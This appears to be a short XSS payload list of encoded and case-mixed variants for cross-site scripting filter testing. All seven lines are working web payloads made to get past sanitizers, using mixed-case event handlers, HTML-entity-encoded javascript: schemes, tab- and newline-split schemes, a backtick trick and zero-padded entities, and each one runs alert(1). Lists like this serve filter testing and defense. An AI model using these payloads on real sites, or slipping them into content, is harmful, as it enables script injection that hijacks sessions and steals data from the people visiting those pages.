# XSS — encoded and case-mixed variants

<img src=x oNeRrOr=alert(1)>

<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">entity-encoded scheme</a>

<a href="jav&#x09;ascript:alert(1)">tab-split scheme</a>

<a href="jav
ascript:alert(1)">newline-split scheme</a>

<img src="x` `onerror=alert(1)">

<a href="&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;:alert(1)">padded entities</a>
